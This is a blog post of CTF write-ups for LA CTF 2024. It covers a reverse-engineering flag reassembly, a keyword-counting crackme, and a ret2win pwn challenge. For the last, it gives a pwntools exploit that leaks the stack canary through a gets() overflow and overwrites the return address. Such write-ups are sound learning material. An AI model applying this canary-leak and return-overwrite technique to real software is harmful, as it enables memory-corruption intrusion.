---
title: "LA CTF"
date: 2024-02-24T16:56:10+10:00
draft: false
toc: false
Summary: "LACTF solved some pwn and rev challenges."
images:
tags:
  - ctf
---

### Shattered Memories
#### rev
This was a binary that appeared to have fractured parts of the flag.

<img src="/images/lactf/flag.png" alt="flag" class="img-tiny">


<img src="/images/lactf/shattered.png" alt="shattered" class="img-medium">

Was just able to assemble the flag based on ordering
`lactf{not_what_forgive_and_forget_means}`

### Aplet321
#### rev
We are given a handy aplet that we can beg for the flag! Lets have a look at main.
```c
  setbuf(stdout,(char *)0x0);
  puts("hi, i\'m aplet321. how can i help?");
  fgets(&local_238,0x200,stdin);
  sVar2 = strlen(&local_238);
  if (5 < sVar2) {
    iVar4 = 0;
    iVar5 = 0;
    pcVar3 = &local_238;
    do {
      iVar1 = strncmp(pcVar3,"pretty",6);
      iVar5 = iVar5 + (uint)(iVar1 == 0);
      iVar1 = strncmp(pcVar3,"please",6);
      iVar4 = iVar4 + (uint)(iVar1 == 0);
      pcVar3 = pcVar3 + 1;
    } while (pcVar3 != acStack567 + ((int)sVar2 - 6));
    if (iVar4 != 0) {
      pcVar3 = strstr(&local_238,"flag");
      if (pcVar3 == (char *)0x0) {
        puts("sorry, i didn\'t understand what you mean");
        return 0;
      }
      if ((iVar5 + iVar4 == 0x36) && (iVar5 - iVar4 == -0x18)) {
        puts("ok here\'s your flag");
        system("cat flag.txt");
        return 0;
      }
      puts("sorry, i\'m not allowed to do that");
      return 0;
    }
  }
  puts("so rude");
  return 0;
}
```

The application looks at our input string and counts the number of times we have 'pretty' and 'please' in our string we additionally have to have the word flag in the string.

Let ivar5 be A and ivar4 be B. We need inputs to satisfy.

A + B = 54

A - B = -24

we can use the elimination method.

(A + B) + (A - B) = 54 - 24
=> 2A = 30

=> A = 30 / 2

=> A = 15

Now, substitute the value of A into one of the equations to solve for B. Let's use the first equation:
A + B = 54

15 + B = 54

=> B = 54 - 15

=> B = 39

So, the two numbers are A = 15 and B = 39.

```python
from pwn import *
r = remote('chall.lac.tf', 31321)
r.readuntil('help?')
payload = ('pretty' * 15) +  ('please'*39) + 'flag'
r.sendline(payload)
r.interactive()
```

<img src="/images/lactf/flag_aplet321.png" alt="flag_aplet321" class="img-large">


### Aplet123
#### pwn

This was the other aplet in lactf but in the pwn category. This was a ret2win challenge as there was a `print_flag` function we just had to call it. But we cant overwrite the return point straight away as their is a canary.
```
[*] '/home/kali/Downloads/lactf/aplet123/aplet123'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```
We can also ask for the flag but its not very nice
```bash
└─$ ./aplet123 
hello
please give me the flag
i'll consider it
no

```

Lets have a look inside main.

```c
{
  int iVar1;
  time_t tVar2;
  char *pcVar3;
  long in_FS_OFFSET;
  char local_58 [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setbuf(stdout,(char *)0x0);
  tVar2 = time((time_t *)0x0);
  srand((uint)tVar2);
  puts("hello");
  while( true ) {
    while( true ) {
      while( true ) {
        gets(local_58);
        pcVar3 = strstr(local_58,"i\'m");
        if (pcVar3 == (char *)0x0) break;
        printf("hi %s, i\'m aplet123\n",pcVar3 + 4);
      }
      iVar1 = strcmp(local_58,"please give me the flag");
      if (iVar1 != 0) break;
      puts("i\'ll consider it");
      sleep(5);
      puts("no");
    }
    iVar1 = strcmp(local_58,"bye");
    if (iVar1 == 0) break;
    iVar1 = rand();
    puts(*(char **)(responses + ((ulong)(long)iVar1 % 0x21) * 8));
  }
  puts("bye");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

We can see that if we introduce ourself it will respond.
``` bash
└─$ ./aplet123
hello
hi i'm turkey
hi turkey, i'm aplet123
```
The point of note if that when the application looks to respond with hi `name` it searches for `name` by indexing +4 after it finds `i'm` in the string. If we fill up the name buffer with `i'm` at the end we can have it greet us with the canary. Once we leak the canary we can then overwrite the return address to the win function.

```python
from pwn import *
from pwnlib.util.packing import p64
context.log_level = 'DEBUG'
elf=context.binary=ELF('./aplet123')
# context(terminal=['tmux', 'splitw', '-h'])

io = remote('chall.lac.tf',31123)


# io = gdb.debug('./aplet123', '''
#     break *main+275
#     continue
# ''')

# gap = 72
payload = 69 * b'A'

payload = payload + b"i'm" 

io.readuntil('hello')
io.sendline(payload)

io.readuntil('hi ')
canary = io.read(7)
canary = b'\x00' + canary

input_bytes = canary
output_bytes = []

for byte in input_bytes:
    output_bytes.append(f'0x{byte:02x}')

print(output_bytes)

#cyclic offset is caa
rsp_offset = cyclic_find('caaa')

payload = payload + canary + b'A'*rsp_offset + p64(elf.symbols['print_flag'])

io.sendline(payload)
io.readuntil('hi ')
io.sendline('bye')

print(payload)

io.interactive()
```